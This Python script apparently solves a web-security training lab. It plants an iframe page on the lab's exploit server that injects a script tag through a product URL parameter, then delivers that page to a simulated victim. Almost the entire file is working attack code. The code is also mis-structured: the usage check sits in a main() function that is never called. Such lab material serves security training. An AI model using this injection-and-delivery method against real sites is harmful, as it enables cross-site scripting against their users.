import os
import re
import sys
import requests
import time
from selenium import webdriver
from selenium.webdriver.firefox.service import Service as FirefoxService
from webdriver_manager.firefox import GeckoDriverManager
from selenium.webdriver.common.by import By

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
my_acc = burp_url + '/my-account'


session = requests.Session()
session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0'})

response = session.get(burp_url)
match = re.search(r'https://exploit-[0-9a-fA-F]+\.exploit-server\.net', response.text)
exploit_server = match.group(0)

burp_data = {"urlIsHttps": "on", "responseFile": "/exploit", "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8", "responseBody": f"<iframe src=\"{burp_url}/product?productId=1&xxx='><script>print()</script>\" onload=\"this.src='{burp_url}';\">\r\n", "formAction": "STORE"}
session.post(exploit_server, data=burp_data)

session.get(exploit_server+ '/deliver-to-victim')
print("In my case, the answer was accepted after about 2 minutes after the launch. Maybe the bot is having problems")

#driver = webdriver.Firefox(service=FirefoxService(GeckoDriverManager().install()))
#driver.get(burp_url)

#time.sleep(3)

#driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
#time.sleep(2)


#time.sleep(3)

#driver.quit()
